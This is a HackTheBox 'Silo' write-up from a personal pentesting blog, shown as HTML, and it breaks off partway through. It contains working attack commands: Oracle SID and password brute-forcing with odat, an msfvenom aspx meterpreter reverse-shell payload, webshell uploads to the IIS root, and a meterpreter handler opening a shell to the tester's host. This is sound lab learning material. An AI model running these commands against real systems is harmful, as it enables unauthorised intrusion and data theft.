@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Silo | Welcome to another retired box from HTB named Silo. This box was really interesting as for the first time I experienced PenTesting against an...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Silo</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-04-14 02:06:00+01:00">Tue 14 April 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Silo.html">Silo</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Silo.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>Welcome to another retired box from HTB named Silo. This box was really interesting as for the first time I experienced PenTesting against an Oracle db. To me this is more relevant than, for example, working with a wordpress exploit. Although the latter would still be very useful for learning purposes, it is very unlikely I will find some of my customers running wordpress. It is, on the other hand, very common that customers I work with use Orable db or similar technologies. I found the box relatively easy thanks to a tool call <code>odat</code>, even if its installation could be somewhat tedious. I had another issue with a special character where I got stuck but eventually found a workaround.    </p>
+<h1 id="nmap">NMAP</h1>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $nmap -sV -sC 10.10.10.82</span>
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-14 05:36 BST</span>
+<span class="go">Nmap scan report for 10.10.10.82</span>
+<span class="go">Host is up (0.11s latency).</span>
+<span class="go">Not shown: 988 closed ports</span>
+<span class="go">PORT      STATE SERVICE      VERSION</span>
+<span class="go">80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="go">| http-methods: </span>
+<span class="go">|_  Potentially risky methods: TRACE</span>
+<span class="go">|_http-server-header: Microsoft-IIS/8.5</span>
+<span class="go">|_http-title: IIS Windows Server</span>
+<span class="go">135/tcp   open  msrpc        Microsoft Windows RPC</span>
+<span class="go">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span>
+<span class="go">445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span>
+<span class="go">1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)</span>
+<span class="go">49152/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="go">49153/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="go">49154/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="go">49155/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="go">49158/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="go">49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)</span>
+<span class="go">49161/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="go">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Host script results:</span>
+<span class="go">|_clock-skew: mean: -36s, deviation: 0s, median: -36s</span>
+<span class="go">|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)</span>
+<span class="go">| smb-security-mode: </span>
+<span class="go">|   account_used: guest</span>
+<span class="go">|   authentication_level: user</span>
+<span class="go">|   challenge_response: supported</span>
+<span class="go">|_  message_signing: supported</span>
+<span class="go">| smb2-security-mode: </span>
+<span class="go">|   2.02: </span>
+<span class="go">|_    Message signing enabled but not required</span>
+<span class="go">| smb2-time: </span>
+<span class="go">|   date: 2020-04-14T04:39:19</span>
+<span class="go">|_  start_date: 2020-04-14T03:54:10</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 198.40 seconds</span>
+</pre></div>
+
+
+<p>There are quite few open ports. One of these is the default port 80 which gives us the default IIS welcome page when launching it from a browser.</p>
+<p><img alt="" src="../images/silo-webpage.png"></p>
+<p>We know we are dealing with a Windows box and probably a Windows Server 2008 R2 as shown in the nmap output. 
+Furthermore, we can see there is an Oracle listener running. After some research I found a great tool called <a href="https://github.com/quentinhardy/odat">odat</a>, Oracle Database Attacking Tool, which we can use in this scenario. The installation requires quite few steps to be honest but it is eventually worth it!</p>
+<p>Once installed, following the instructions at https://github.com/quentinhardy/odat, we can run the following command to guess the Oracle SID, that is the Oracle System ID used to uniquely identify a database on a system. </p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Tools/odat]</span>
+<span class="go">└──╼ $python3 odat.py sidguesser -s 10.10.10.82 -p 1521</span>
+<span class="go">odat.py:52: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module&#39;s documentation for alternative uses</span>
+<span class="go">  import imp</span>
+
+<span class="go">[1] (10.10.10.82:1521): Searching valid SIDs</span>
+<span class="go">[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server</span>
+<span class="go">[+] &#39;XE&#39; is a valid SID. Continue...                   ##################################################################################################################################################################  | ETA:  00:00:01 </span>
+<span class="go">[+] &#39;XEXDB&#39; is a valid SID. Continue...                </span>
+<span class="go">100% |#####################################################################################################################################################################################################################| Time: 00:03:15 </span>
+<span class="go">[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521)</span>
+<span class="go">100% |#####################################################################################################################################################################################################################| Time: 00:00:06 </span>
+<span class="go">[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521)</span>
+<span class="go">[+] &#39;XE&#39; is a valid SID. Continue...                   ############################################################################################################################################                        | ETA:  00:00:18 </span>
+<span class="go">100% |#####################################################################################################################################################################################################################| Time: 00:02:51 </span>
+<span class="go">[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB</span>
+</pre></div>
+
+
+<p>From the output we deduct there are two SIDs, <code>XE</code> and <code>XEXDB</code>.</p>
+<p>Now that we have the SID we can try to guess the password this way:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Tools/odat]</span>
+<span class="go">└──╼ $python3 odat.py passwordguesser -s 10.10.10.82 -d XE </span>
+
+<span class="go">[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521</span>
+<span class="go">The login CIS has already been tested at least once. What do you want to do:                                                                                                                                               | ETA:  00:08:35 </span>
+<span class="go">- stop (s/S)</span>
+<span class="go">- continue and ask every time (a/A)</span>
+<span class="go">- continue without to ask (c/C)</span>
+<span class="go">c</span>
+<span class="go">100% |#####################################################################################################################################################################################################################| Time: 00:11:33 </span>
+<span class="go">[-] No found a valid account on 10.10.10.82:1521/XE. You should try with the option &#39;--accounts-file accounts/accounts_multiple.txt&#39; or &#39;--accounts-file accounts/logins.txt accounts/pwds.txt&#39;</span>
+</pre></div>
+
+
+<p>After about 10 minutes <code>odat</code> did not find anything. After some more research I found someone on the web suggesting to use metasploit Oracle wordlist file because it contains non-capital and capital words whereas <code>odat</code> default wordlist file contains words only in capital. Odat default wordlist file is located under <code>odat/accounts/accounts.txt</code> and it contains credentials on this format:</p>
+<p><code>USER/PASSWORD</code></p>
+<p>whwreas metasploit wordlist file contains the credentials in this format:</p>
+<p><code>USER PASSWORD</code></p>
+<p>So I changed the format of the oracle wordlist file to be the same as the odat default one. </p>
+<p>I did this within <code>vim</code> by running <code>:%s/ /\//g</code>.</p>
+<p>After that I re-ran the command using the new wordlist file:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~/Tools/odat]</span>
+<span class="go">└──╼ $python3 odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file accounts/oracle_default_userpass.txt</span>
+
+<span class="go">[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521</span>
+<span class="go">The login cdemo82 has already been tested at least once. What do you want to do:                                                                                                                                           | ETA:  00:09:32 </span>
+<span class="go">- stop (s/S)</span>
+<span class="go">- continue and ask every time (a/A)</span>
+<span class="go">- continue without to ask (c/C)</span>
+<span class="go">c</span>
+<span class="go">[+] Valid credentials found: scott/tiger. Continue... ######################################################################################################################################################               | ETA:  00:00:45 </span>
+<span class="go">100% |#####################################################################################################################################################################################################################| Time: 00:10:56 </span>
+<span class="go">[+] Accounts found on 10.10.10.82:1521/XE: </span>
+<span class="go">scott/tiger</span>
+</pre></div>
+
+
+<p>This time we found valid credentials: <code>scott/tiger</code>.</p>
+<p>Armed with these credentials we can now try to login to the db with <code>sqlplus</code>:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $sqlplus64 scott/tiger@10.10.10.82:1521/XE</span>
+
+<span class="go">SQL*Plus: Release 19.0.0.0.0 - Production on Tue Apr 14 16:50:50 2020</span>
+<span class="go">Version 19.6.0.0.0</span>
+
+<span class="go">Copyright (c) 1982, 2019, Oracle.  All rights reserved.</span>
+
+<span class="go">ERROR:</span>
+<span class="go">ORA-28002: the password will expire within 7 days</span>
+
+
+
+<span class="go">Connected to:</span>
+<span class="go">Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</span>
+
+<span class="go">SQL&gt; select * from user_role_privs;</span>
+
+<span class="go">USERNAME                       GRANTED_ROLE                   ADM DEF OS_</span>
+<span class="go">------------------------------ ------------------------------ --- --- ---</span>
+<span class="go">SCOTT                          CONNECT                        NO  YES NO</span>
+<span class="go">SCOTT                          RESOURCE                       NO  YES NO</span>
+
+<span class="go">SQL&gt; </span>
+</pre></div>
+
+
+<p>As shown above, after connecting successfully I ran a select command to check the privileges and we can see scott does not have admin priveleges. Let's see if we are able to login <code>as sysdba</code>:</p>
+<div class="highlight"><pre><span></span><span class="go">luar@SittingDucks]─[~]</span>
+<span class="go">└──╼ $sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba</span>
+
+<span class="go">SQL*Plus: Release 19.0.0.0.0 - Production on Tue Apr 14 16:54:43 2020</span>
+<span class="go">Version 19.6.0.0.0</span>
+
+<span class="go">Copyright (c) 1982, 2019, Oracle.  All rights reserved.</span>
+
+
+<span class="go">Connected to:</span>
+<span class="go">Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</span>
+
+<span class="go">SQL&gt; select * from user_role_privs;</span>
+
+<span class="go">USERNAME                       GRANTED_ROLE                   ADM DEF OS_</span>
+<span class="go">------------------------------ ------------------------------ --- --- ---</span>
+<span class="go">SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO</span>
+<span class="go">SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO</span>
+<span class="go">SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO</span>
+<span class="go">SYS                            AQ_USER_ROLE                   YES YES NO</span>
+<span class="go">SYS                            AUTHENTICATEDUSER              YES YES NO</span>
+<span class="go">SYS                            CONNECT                        YES YES NO</span>
+<span class="go">SYS                            CTXAPP                         YES YES NO</span>
+<span class="go">SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO</span>
+<span class="go">SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO</span>
+<span class="go">SYS                            DBA                            YES YES NO</span>
+<span class="go">SYS                            DBFS_ROLE                      YES YES NO</span>
+
+<span class="go">USERNAME                       GRANTED_ROLE                   ADM DEF OS_</span>
+<span class="go">------------------------------ ------------------------------ --- --- ---</span>
+<span class="go">SYS                            DELETE_CATALOG_ROLE            YES YES NO</span>
+<span class="go">SYS                            EXECUTE_CATALOG_ROLE           YES YES NO</span>
+<span class="go">SYS                            EXP_FULL_DATABASE              YES YES NO</span>
+<span class="go">SYS                            GATHER_SYSTEM_STATISTICS       YES YES NO</span>
+<span class="go">SYS                            HS_ADMIN_EXECUTE_ROLE          YES YES NO</span>
+<span class="go">SYS                            HS_ADMIN_ROLE                  YES YES NO</span>
+<span class="go">SYS                            HS_ADMIN_SELECT_ROLE           YES YES NO</span>
+<span class="go">SYS                            IMP_FULL_DATABASE              YES YES NO</span>
+<span class="go">SYS                            LOGSTDBY_ADMINISTRATOR         YES YES NO</span>
+<span class="go">SYS                            OEM_ADVISOR                    YES YES NO</span>
+<span class="go">SYS                            OEM_MONITOR                    YES YES NO</span>
+
+<span class="go">USERNAME                       GRANTED_ROLE                   ADM DEF OS_</span>
+<span class="go">------------------------------ ------------------------------ --- --- ---</span>
+<span class="go">SYS                            PLUSTRACE                      YES YES NO</span>
+<span class="go">SYS                            RECOVERY_CATALOG_OWNER         YES YES NO</span>
+<span class="go">SYS                            RESOURCE                       YES YES NO</span>
+<span class="go">SYS                            SCHEDULER_ADMIN                YES YES NO</span>
+<span class="go">SYS                            SELECT_CATALOG_ROLE            YES YES NO</span>
+<span class="go">SYS                            XDBADMIN                       YES YES NO</span>
+<span class="go">SYS                            XDB_SET_INVOKER                YES YES NO</span>
+<span class="go">SYS                            XDB_WEBSERVICES                YES YES NO</span>
+<span class="go">SYS                            XDB_WEBSERVICES_OVER_HTTP      YES YES NO</span>
+<span class="go">SYS                            XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO</span>
+
+<span class="go">32 rows selected.</span>
+</pre></div>
+
+
+<p>Indeed connecting <code>as sysdba</code> shows that scott has admin privileges and this will be very useful since it will allow us to perform a set of actions that will eventually give us what we want. </p>
+<p>One thing I like to do whenever possible is to create my own user and don't mess around with the current one. So I do that:</p>
+<div class="highlight"><pre><span></span><span class="go">SQL&gt; create user m4rc0 identified by myp4ssw0rd;</span>
+
+<span class="go">User created.</span>
+
+<span class="go">SQL&gt; grant dba to m4rc0;</span>
+
+<span class="go">Grant succeeded.</span>
+
+<span class="go">SQL&gt; </span>
+</pre></div>
+
+
+<p>Now I need to find a way to get a shell. Looking within the options of <code>odat</code> there are two interesting ones:</p>
+<div class="highlight"><pre><span></span><span class="go">dbmsxslprocessor  to upload files</span>
+<span class="go">dbmsadvisor       to upload files</span>
+</pre></div>
+
+
+<p>So we will try to use one of these to upload a webshell to the victing machine. To understand what could be a suitable shell I run the below <code>curl</code> command. </p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $curl -I 10.10.10.82</span>
+<span class="go">HTTP/1.1 200 OK</span>
+<span class="go">Content-Length: 701</span>
+<span class="go">Content-Type: text/html</span>
+<span class="go">Last-Modified: Wed, 03 Jan 2018 00:36:17 GMT</span>
+<span class="go">Accept-Ranges: bytes</span>
+<span class="go">ETag: &quot;1114bde2a84d31:0&quot;</span>
+<span class="go">Server: Microsoft-IIS/8.5</span>
+<span class="go">X-Powered-By: ASP.NET</span>
+<span class="go">Date: Tue, 14 Apr 2020 16:08:42 GMT</span>
+</pre></div>
+
+
+<p>This tells me that we are dealing with the <code>ASP.NET</code> framework and therefore I will create an <code>aspx</code> webshell and upload it to the victim box (I tried <code>asp</code> before <code>aspx</code> but didn't work) . To generate the payload I will use <code>msfvenom</code>:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/silo]</span>
+<span class="go">└──╼ $msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.6 LPORT=443 -f aspx  -o shell.aspx</span>
+<span class="go">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span>
+<span class="go">[-] No arch selected, selecting arch: x86 from the payload</span>
+<span class="go">No encoder or badchars specified, outputting raw payload</span>
+<span class="go">Payload size: 604 bytes</span>
+<span class="go">Final size of aspx file: 4118 bytes</span>
+<span class="go">Saved as: shell.aspx</span>
+<span class="go">┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/silo]</span>
+<span class="go">└──╼ $ll</span>
+<span class="go">total 8.0K</span>
+<span class="go">-rw-r--r-- 1 m4rc0 m4rc0 4.1K Apr 14 22:51 shell.aspx</span>
+</pre></div>
+
+
+<p>and then I upload the file in the IIS root directory (default is <code>C:\inetput\wwwroot</code>)</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Tools/odat]</span>
+<span class="go">└──╼ $python3 odat.py dbmsxslprocessor -s 10.10.10.82 -U m4rc0 -P myp4ssw0rd  -d XE --sysdba --putFile &quot;C:\inetpub\wwwroot&quot; &quot;shell.aspx&quot; &quot;/home/m4rc0/Documents/htb/boxes/silo/shell.aspx&quot;</span>
+
+<span class="go">[1] (10.10.10.82:1521): Put the /home/m4rc0/Documents/htb/boxes/silo/shell.aspx local file in the C:\inetpub\wwwroot path (named shell.aspx) of the 10.10.10.82 server</span>
+<span class="go">[+] The /home/m4rc0/Documents/htb/boxes/silo/shell.aspx local file was put in the remote C:\inetpub\wwwroot path (named shell.aspx)</span>
+</pre></div>
+
+
+<p>Once we have the file in that directory I start a meterpreter listenr and then I browse to the <code>aspx</code> payload to activate the shell:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~/Tools/odat]</span>
+<span class="go">└──╼ $curl http://10.10.10.82/shell.aspx</span>
+</pre></div>
+
+
+<p>and we get the shell:</p>
+<div class="highlight"><pre><span></span><span class="go">msf5 &gt; use exploit/multi/handler</span>
+<span class="go">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_https</span>
+<span class="go">payload =&gt; windows/x64/meterpreter/reverse_https</span>
+<span class="go">msf5 exploit(multi/handler) &gt; set LHOST 10.10.14.6</span>
+<span class="go">LHOST =&gt; 10.10.14.6</span>
+<span class="go">msf5 exploit(multi/handler) &gt; set LPORT 443</span>
+<span class="go">LPORT =&gt; 443</span>
+<span class="go">msf5 exploit(multi/handler) &gt; run</span>
+
+<span class="go">[*] Started HTTPS reverse handler on https://10.10.14.6:443</span>
+<span class="go">[*] https://10.10.14.6:443 handling request from 10.10.10.82; (UUID: lwv93nms) Staging x64 payload (207449 bytes) ...</span>
+<span class="go">[*] Meterpreter session 1 opened (10.10.14.6:443 -&gt; 10.10.10.82:49166) at 2020-04-14 23:28:40 +0100</span>
+
+<span class="go">meterpreter &gt;shell</span>
+<span class="go">Process 1692 created.</span>
+<span class="go">Channel 1 created.</span>
+<span class="go">Microsoft Windows [Version 6.3.9600]</span>
+<span class="gp gp-VirtualEnv">(c)</span> <span class="go">2013 Microsoft Corporation. All rights reserved.</span>
+
+<span class="go">c:\windows\system32\inetsrv&gt;whoami</span>
+<span class="go">whoami</span>
+<span class="go">iis apppool\defaultapppool&gt;</span>
+</pre></div>
+
+
+<p>then I moved to the Users directory and noticed the user <code>Phineas</code> and inside his desktop I found the <code>user.txt</code>:</p>
+<div class="highlight"><pre><span></span><span class="go">c:\Users&gt;dir</span>
+<span class="go">dir</span>
+<span class="go"> Volume in drive C has no label.</span>
+<span class="go"> Volume Serial Number is 78D4-EA4D</span>
+
+<span class="go"> Directory of c:\Users</span>
+
+<span class="go">01/04/2018  10:40 PM    &lt;DIR&gt;          .</span>
+<span class="go">01/04/2018  10:40 PM    &lt;DIR&gt;          ..</span>
+<span class="go">01/03/2018  02:03 AM    &lt;DIR&gt;          .NET v2.0</span>
+<span class="go">01/03/2018  02:03 AM    &lt;DIR&gt;          .NET v2.0 Classic</span>
+<span class="go">01/03/2018  10:23 PM    &lt;DIR&gt;          .NET v4.5</span>
+<span class="go">01/03/2018  10:23 PM    &lt;DIR&gt;          .NET v4.5 Classic</span>
+<span class="go">01/01/2018  01:49 AM    &lt;DIR&gt;          Administrator</span>
+<span class="go">01/03/2018  02:03 AM    &lt;DIR&gt;          Classic .NET AppPool</span>
+<span class="go">01/07/2018  03:04 PM    &lt;DIR&gt;          Phineas</span>
+<span class="go">08/22/2013  04:39 PM    &lt;DIR&gt;          Public</span>
+<span class="go">               0 File(s)              0 bytes</span>
+<span class="go">              10 Dir(s)  15,184,658,432 bytes free</span>
+
+<span class="go">c:\Users&gt;cd phineas</span>
+<span class="go">cd phineas</span>
+
+<span class="go">c:\Users\Phineas&gt;cd desktop</span>
+<span class="go">cd desktop</span>
+
+<span class="go">c:\Users\Phineas\Desktop&gt;dir</span>
+<span class="go">dir</span>
+<span class="go"> Volume in drive C has no label.</span>
+<span class="go"> Volume Serial Number is 78D4-EA4D</span>
+
+<span class="go"> Directory of c:\Users\Phineas\Desktop</span>
+
+<span class="go">01/07/2018  03:03 PM    &lt;DIR&gt;          .</span>
+<span class="go">01/07/2018  03:03 PM    &lt;DIR&gt;          ..</span>
+<span class="go">01/05/2018  11:56 PM               300 Oracle issue.txt</span>
+<span class="go">01/04/2018  10:41 PM                32 user.txt</span>
+<span class="go">               2 File(s)            332 bytes</span>
+<span class="go">               2 Dir(s)  15,184,654,336 bytes free</span>
+
+<span class="go">c:\Users\Phineas\Desktop&gt;type user.txt</span>
+<span class="go">type user.txt</span>
+<span class="go">92****************************17</span>
+<span class="go">c:\Users\Phineas\Desktop&gt;</span>
+</pre></div>
+
+
+<p>together with the <code>user.txt</code> file we can see another text file in the Desktop so I decided to have a look:</p>
+<div class="highlight"><pre><span></span><span class="go">c:\Users\Phineas\Desktop&gt;type &quot;Oracle issue.txt&quot;</span>
+<span class="go">type &quot;Oracle issue.txt&quot;</span>
+<span class="go">Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):</span>
+
+<span class="go">Dropbox link provided to vendor (and password under separate cover).</span>
+
+<span class="go">Dropbox link </span>
+<span class="go">https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0</span>
+
+<span class="go">link password:</span>
+<span class="gp">%</span>Hm8646uC$
+</pre></div>
+
+
+<p>So we have a dropbox link and a password but if I try to download that file it fails stating that the password is incorrect. </p>
+<p><img alt="" src="../images/silo-dropbox.png"></p>
+<p>So I started thinking it was just a trick to make me waste time. However, I remembered that some unicode characters may behave funny over shells so I decided to double check by downloading the file on my box.</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~/Tools/odat]</span>
+<span class="go">└──╼ $python3 odat.py dbmsxslprocessor -s 10.10.10.82 -U m4rc0 -P myp4ssw0rd  -d XE --sysdba --getFile &quot;c:\Users\Phineas\Desktop&quot; &quot;Oracle issue.txt&quot; &quot;/home/m4rc0/Documents/htb/boxes/silo/OracleIssue.txt&quot;</span>
+
+<span class="go">[1] (10.10.10.82:1521): Get the /home/m4rc0/Documents/htb/boxes/silo/OracleIssue.txt remote file from the c:\Users\Phineas\Desktop path (named Oracle issue.txt) of the 10.10.10.82 server</span>
+<span class="go">[+] The Oracle issue.txt remote file was downloaded in /home/m4rc0/Documents/htb/boxes/silo/OracleIssue.txt</span>
+<span class="go">┌─[m4rc0@SittingDucks]─[~/Tools/odat]</span>
+<span class="go">└──╼ $cat /home/m4rc0/Documents/htb/boxes/silo/OracleIssue.txt</span>
+<span class="go">Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):</span>
+
+<span class="go">Dropbox link provided to vendor (and password under separate cover).</span>
+
+<span class="go">Dropbox link </span>
+<span class="go">https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0</span>
+
+<span class="go">link password:</span>
+<span class="go">�%Hm8646uC$</span>
+</pre></div>
+
+
+<p>once downloaded the file I get the another character at the beginning, I try again but same result, password incorrect.</p>
+<p>Searching on google I found this on wikipedia:</p>
+<p>"The replacement character (often a black diamond with a white question mark or an empty square box) is a symbol found in the Unicode standard at code point U+FFFD in the Specials table. It is used to indicate problems when a system is unable to render a stream of data to a correct symbol." So this confirms the thesis that there is a rendering problem with this specific character and I don't know how to fix this issue. I even dowloaded the file on another box and tried with several different text editors like notepad++, MS Word, Sublime text, but I was unable to get that character rendered properly. After doing some research I found someone online was able to get the real characher through a webshell. So I downloaded an aspx webshell, available here https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx, and I uploaded it to the victim box using the same technique as before:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Tools/odat]</span>
+<span class="go">└──╼ $python3 odat.py dbmsxslprocessor -s 10.10.10.82 -U m4rc0 -P myp4ssw0rd  -d XE --sysdba --putFile &quot;C:\inetpub\wwwroot&quot; &quot;webshell.aspx&quot; &quot;/home/m4rc0/Documents/htb/boxes/silo/webshell.aspx&quot;</span>
+
+<span class="go">[1] (10.10.10.82:1521): Put the /home/m4rc0/Documents/htb/boxes/silo/webshell.aspx local file in the C:\inetpub\wwwroot path (named webshell.aspx) of the 10.10.10.82 server</span>
+<span class="go">[+] The /home/m4rc0/Documents/htb/boxes/silo/webshell.aspx local file was put in the remote C:\inetpub\wwwroot path (named webshell.aspx)</span>
+</pre></div>
+
+
+<p>Then I browse the webpage:</p>
+<p><img alt="" src="../images/silo-webshell.png"></p>
+<p>Now we can see a <code>£</code> as the first character of the password: <code>£%Hm8646uC$</code>.</p>
+<p>Now I was able to login successfully and dowload the file which seems to be a memory dump:</p>
+<p><img alt="" src="../images/silo-mdump.png"></p>
+<p>Then I unzip the file and I scan the dump with <code>volatility</code>:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~]                                                                                                 </span>
